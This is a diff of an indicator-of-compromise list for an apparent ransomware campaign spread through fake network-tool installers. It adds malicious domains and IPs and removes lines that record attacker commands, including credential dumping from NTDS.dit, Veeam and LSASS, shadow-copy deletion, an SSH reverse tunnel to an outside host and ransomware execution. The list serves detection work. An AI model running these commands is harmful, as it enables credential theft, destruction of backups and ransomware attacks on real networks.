@@ -2,6 +2,11 @@ opmanager.pro
 download-center.online
 ip-scanner.org
 soft-hub.pro
+download-server.online
+soft-server.online
+zenmap.pro
+netml.shop
+shopping5.shop
 ev2sirbd269o5j.org
 2rxyt8yrhq0bgj.org
 d1hmxkpwby0d4s.org
@@ -25,6 +30,8 @@ v5rjsdqogstopr.org
 185.174.100.203
 170.130.55.223
 83.229.17.60
+84.32.84.32
+4.239.95.1
 124a48b78060fa851e1cc077ca35713c
 ca8646dfc88423bb9fffda811160cebe
 8c113b3aa82c81eee7c6b4ed0ba9a90f
@@ -35,15 +42,9 @@ d66944e1a57daf04d3e809f22cd01946d593acaf
 a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331
 de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
 ManageEngine-OpManager.msi
-msimg32.dll
-consent.exe
 AdgNsy.exe
 locker.exe
-win.exe
 nudwee.exe
-n.exe
-FileZilla_3.68.1_win64_sponsored2-setup.exe
-1.ps1
 hasherezade_pussy.dll
 %TEMP%\ApplicationInstallationFolder_11\consent.exe
 %TEMP%\ApplicationInstallationFolder_11\msimg32.dll
@@ -51,7 +52,6 @@ hasherezade_pussy.dll
 C:\ProgramData\locker.exe
 C:\ProgramData\win.exe
 C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe
-C:\ProgramData\shares.txt
 C:\ProgramData\AdComputers.csv
 C:\ProgramData\AdUsers.csv
 C:\ProgramData\spn.txt
@@ -64,16 +64,6 @@ backup_DA
 backup_EA
 mgdsrv
 KMHLPSVC
+cloudflared
 rwdrv.sys
 hlpdrv.sys
-wbadmin start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit
-psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
-rundll32.exe C:\windows\System32\comsvcs.dll MiniDump
-powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
-ssh root@193.242.184.150 -R *:10400 -p22
-locker.exe -p=G:\ -n=15
-win.exe -n=2 netonly
-RustDesk.exe --tray
-Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\programdata\shares.txt
-CmD.eXe
-pOWerShELl.exE
